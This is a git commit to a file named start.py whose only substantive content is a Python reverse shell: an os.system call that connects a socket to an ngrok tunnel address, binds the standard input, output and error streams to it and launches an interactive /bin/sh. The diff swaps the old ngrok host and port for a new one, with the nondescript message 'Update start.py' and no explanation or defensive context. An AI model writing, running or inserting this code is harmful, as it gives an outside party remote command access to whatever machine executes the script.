1ee3c0ecc9fe96405338a38c09adb4f33be57ff0
MaikinT <93747522+MaikinT@users.noreply.github.com>
2021-11-05 08:58:48 -0300

    Update start.py

--- start.py
+++ start.py
@@ -1,5 +1,5 @@
 import os
 
 
-os.system('''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("6.tcp.ngrok.io",16182));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ''')
+os.system('''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("2.tcp.ngrok.io",17605));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ''')
 
